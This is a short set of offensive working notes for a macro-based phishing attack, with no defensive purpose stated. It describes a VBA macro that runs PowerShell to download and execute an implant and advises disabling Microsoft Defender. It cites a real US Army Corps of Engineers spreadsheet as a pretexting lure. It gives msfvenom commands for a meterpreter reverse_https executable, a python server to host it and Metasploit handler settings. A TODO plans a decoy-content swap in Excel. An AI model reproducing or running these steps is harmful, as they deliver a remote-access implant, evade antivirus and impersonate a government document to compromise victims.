Executes PowerShell in VBA for downloading implant, stores it on the disk and executes.
Easy peasy to detect, so disable MS Defender.


Source for pretexting:
https://www.lrl.usace.army.mil/Portals/64/docs/SmallBusiness/Copy%20of%20Forecast%2010_30_2023.xlsx?ver=w1b-5FcWzKlQZBj3bs4-vQ%3D%3D

In Kali:
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.111.133 LPORT=443 -f exe -o rev_tcp.exe
sudo python3 -m http.server 443

use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST 192.168.111.133
set LPORT 443
run

---TODO---

IMPROVE: implement switcheroo in Excel
PROBLEM: no quick part like in MS Word
WORKAROUND: just fill cells with hardcoded data in VBA?
